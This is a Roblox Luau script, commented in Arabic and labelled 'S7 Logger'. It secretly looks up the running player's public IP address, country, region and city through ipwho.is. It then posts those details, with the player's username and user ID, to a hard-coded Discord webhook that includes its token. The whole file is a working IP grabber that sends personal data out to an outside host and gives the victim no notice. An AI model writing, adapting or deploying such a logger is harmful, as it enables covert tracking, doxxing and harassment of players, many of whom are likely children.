Local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ضع رابط الويب هوك الخاص بك هنا بين العلامتين
local WEBHOOK_URL = "https://discord.com/api/webhooks/1558549570064224398/-komilk4yZho8POMaB_4TKlHQKYoKUsEACDNtTF96cjqD6qOD9eljlxtDDkxoedBvV9B"

-- جلب بيانات الـ IP واللموقع
local success, response = pcall(function()
    return HttpService:RequestAsync({
        Url = "https://ipwho.is/",
        Method = "GET",
        Headers = {
            ["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
        }
    })
end)

if success and response.Success then
    local data67 = HttpService:JSONDecode(response.Body)

    -- تجهيز هيكل الـ Embed الخاص بديسكورد
    local embedData = {
        ["username"] = "Player Info Logger",
        ["embeds"] = {
            {
                ["title"] = "📌 New Player Information Captured",
                ["color"] = 0xFF0055, -- لون شريط الـ Embed (أحمر نيون)
                ["fields"] = {
                    {
                        ["name"] = "👤 Player Name",
                        ["value"] = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🆔 User ID",
                        ["value"] = tostring(LocalPlayer.UserId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🌐 IP Address",
                        ["value"] = data67.ip or "Unknown",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🏳️ Country",
                        ["value"] = data67.country or "Unknown",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🏙️ Region",
                        ["value"] = data67.region or "Unknown",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📍 City",
                        ["value"] = data67.city or "Unknown",
                        ["inline"] = true
                    }
                },
                ["footer"] = {
                    ["text"] = "S7 Logger • " .. os.date("%Y-%m-%d %H:%M:%S")
                }
            }
        }
    }

    -- تحويل البيانات إلى صيغة JSON
    local jsonData = HttpService:JSONEncode(embedData)

    -- إرسال البيانات إلى Webhook
    if WEBHOOK_URL ~= "ضع_رابط_الويب_هوك_هنا" and WEBHOOK_URL ~= "" then
        local sendSuccess, sendErr = pcall(function()
            HttpService:RequestAsync({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        end)

        if sendSuccess then
            print(" Successfully sent info to Discord!")
        else
            warn("❌ Failed to send to Webhook: " .. tostring(sendErr))
        end
    else
        warn("⚠️ Please set a valid Discord Webhook URL!")
    end
else
    warn("❌ Failed to fetch IP info from ipwho.is")
end
